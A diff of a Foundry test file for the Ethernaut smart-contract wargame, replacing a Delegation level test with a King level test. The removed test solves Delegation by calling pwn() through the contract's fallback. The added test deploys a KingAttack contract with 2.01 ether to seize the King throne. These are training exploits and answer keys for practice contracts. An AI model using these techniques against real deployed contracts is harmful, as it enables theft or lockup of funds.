@@ -4,14 +4,15 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import {Utils} from "test/utils/Utils.sol";
 
-import {Delegation} from "src/levels/Delegation.sol";
-import {DelegationFactory} from "src/levels/DelegationFactory.sol";
+import {King} from "src/levels/King.sol";
+import {KingFactory} from "src/levels/KingFactory.sol";
+import {KingAttack} from "src/attacks/KingAttack.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
 
-contract TestDelegation is Test, Utils {
+contract TestKing is Test, Utils {
     Ethernaut ethernaut;
-    Delegation instance;
+    King instance;
 
     address payable owner;
     address payable player;
@@ -31,12 +32,12 @@ contract TestDelegation is Test, Utils {
 
         vm.startPrank(owner);
         ethernaut = getEthernautWithStatsProxy(owner);
-        DelegationFactory factory = new DelegationFactory();
+        KingFactory factory = new KingFactory();
         ethernaut.registerLevel(Level(address(factory)));
         vm.stopPrank();
 
         vm.startPrank(player);
-        instance = Delegation(createLevelInstance(ethernaut, Level(address(factory)), 0));
+        instance = King(payable(createLevelInstance(ethernaut, Level(address(factory)), 0.001 ether)));
         vm.stopPrank();
     }
 
@@ -46,7 +47,7 @@ contract TestDelegation is Test, Utils {
 
     /// @notice Check the intial state of the level and enviroment.
     function testInit() public {
-        vm.prank(player);
+        vm.startPrank(player);
         assertFalse(submitLevelInstance(ethernaut, address(instance)));
     }
 
@@ -54,8 +55,8 @@ contract TestDelegation is Test, Utils {
     function testSolve() public {
         vm.startPrank(player);
 
-        (bool success,) = address(instance).call(abi.encodeWithSignature("pwn()"));
-        require(success, "call not successful");
+        KingAttack attacker = new KingAttack();
+        attacker.doYourThing{value: 2.01 ether}(address(instance));
 
         assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
